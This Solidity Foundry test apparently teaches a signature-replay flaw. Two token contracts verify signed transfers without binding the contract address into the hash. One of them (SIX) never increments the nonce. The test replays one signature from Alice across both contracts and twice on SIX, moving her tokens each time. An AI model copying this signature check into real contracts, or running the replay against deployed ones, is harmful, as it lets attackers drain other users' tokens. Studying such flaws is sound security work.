pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    SocialtokenWhale KarmatokenWhaleContract;
    SixEyeSocialtoken SixEyeReputationtokenContract;
    address alice = vm.addr(1);
    address bob = vm.addr(2);

    constructor() {
        KarmatokenWhaleContract = new SocialtokenWhale();
        KarmatokenWhaleContract.KarmatokenWhaleDeploy(address(this));
        KarmatokenWhaleContract.shareKarma(alice, 1000);
        SixEyeReputationtokenContract = new SixEyeSocialtoken();
        SixEyeReputationtokenContract.KarmatokenWhaleDeploy(address(this));
        SixEyeReputationtokenContract.shareKarma(alice, 1000);
    }

    function testSignatureReplay() public {
        emit log_named_uint(
            "Balance",
            KarmatokenWhaleContract.reputationOf(address(this))
        );

        bytes32 hash = keccak256(
            abi.encodePacked(
                address(alice),
                address(bob),
                uint256(499),
                uint256(1),
                uint256(0)
            )
        );
        emit log_named_bytes32("hash", hash);


        (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash);
        emit log_named_uint("v", v);
        emit log_named_bytes32("r", r);
        emit log_named_bytes32("s", s);

        address alice_address = ecrecover(hash, v, r, s);
        emit log_named_address("alice_address", alice_address);
        emit log_string(
            "If operator got the Alice's signature, the operator can replay this signature on the others contracts with same method."
        );
        vm.startPrank(bob);

        KarmatokenWhaleContract.sendtipProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );

        emit log_named_uint(
            "SET token balance of Bob",
            KarmatokenWhaleContract.reputationOf(address(bob))
        );


        emit log_string(
            "Try to replay to another contract with same signature"
        );
        emit log_named_uint(
            "Before the replay, SIX token balance of bob:",
            SixEyeReputationtokenContract.reputationOf(address(bob))
        );

        SixEyeReputationtokenContract.sendtipProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the replay, SIX token balance of bob:",
            SixEyeReputationtokenContract.reputationOf(address(bob))
        );

        SixEyeReputationtokenContract.sendtipProxy(
            address(alice),
            address(bob),
            499,
            1,
            v,
            r,
            s
        );
        emit log_named_uint(
            "After the second replay, SIX token balance of bob:",
            SixEyeReputationtokenContract.reputationOf(address(bob))
        );
    }
}

contract SocialtokenWhale is Test {
    address player;

    uint256 public pooledInfluence;
    mapping(address => uint256) public reputationOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function KarmatokenWhaleDeploy(address _player) public {
        player = _player;
        pooledInfluence = 2000;
        reputationOf[player] = 2000;
    }

    function _sendtip(address to, uint256 value) internal {
        reputationOf[msg.sender] -= value;
        reputationOf[to] += value;
    }

    function shareKarma(address to, uint256 value) public {
        require(reputationOf[msg.sender] >= value);
        require(reputationOf[to] + value >= reputationOf[to]);

        _sendtip(to, value);
    }

    function sendtipProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        emit log_named_uint("nonce", nonce);
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            reputationOf[_to] + _value < reputationOf[_to] ||
            reputationOf[msg.sender] + _feeUgt < reputationOf[msg.sender]
        ) revert();
        reputationOf[_to] += _value;

        reputationOf[msg.sender] += _feeUgt;

        reputationOf[_from] -= _value + _feeUgt;
        nonces[_from] = nonce + 1;
        return true;
    }
}

contract SixEyeSocialtoken is Test {
    address player;

    uint256 public pooledInfluence;
    mapping(address => uint256) public reputationOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Six Eye Token";
    string public symbol = "SIX";
    uint8 public decimals = 18;
    mapping(address => uint256) nonces;

    function KarmatokenWhaleDeploy(address _player) public {
        player = _player;
        pooledInfluence = 2000;
        reputationOf[player] = 2000;
    }

    function _sendtip(address to, uint256 value) internal {
        reputationOf[msg.sender] -= value;
        reputationOf[to] += value;
    }

    function shareKarma(address to, uint256 value) public {
        require(reputationOf[msg.sender] >= value);
        require(reputationOf[to] + value >= reputationOf[to]);

        _sendtip(to, value);
    }

    function sendtipProxy(
        address _from,
        address _to,
        uint256 _value,
        uint256 _feeUgt,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public returns (bool) {
        uint256 nonce = nonces[_from];
        bytes32 h = keccak256(
            abi.encodePacked(_from, _to, _value, _feeUgt, nonce)
        );
        if (_from != ecrecover(h, _v, _r, _s)) revert();

        if (
            reputationOf[_to] + _value < reputationOf[_to] ||
            reputationOf[msg.sender] + _feeUgt < reputationOf[msg.sender]
        ) revert();
        reputationOf[_to] += _value;

        reputationOf[msg.sender] += _feeUgt;

        reputationOf[_from] -= _value + _feeUgt;
        return true;
    }
}